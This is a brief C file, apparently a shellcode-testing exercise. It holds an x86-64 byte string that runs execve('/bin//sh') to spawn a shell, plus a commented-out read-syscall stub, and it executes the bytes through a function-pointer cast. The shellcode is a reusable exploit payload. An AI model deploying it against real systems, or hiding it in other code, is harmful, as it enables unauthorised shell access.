/*==============================================================================

# Author:       lang  lyi4ng@gmail.com
# Filetype:     C source code
# Environment:  Linux & Archlinux
# Tool:         Vim & Gcc
# Date:         2019.09.17
# Descprition:  Randomly written code

================================================================================*/

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

//char shellcode[] = "\x50\x54\x5e\x48\x83\xc6\x16\x48\x31\xff\xb2\x16\x0f\x05\x56\xc3";
char shellcode[] = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05";
int main(int argc, char *argv[])
{
	(*(void (*)())shellcode)();

	return 0;

}

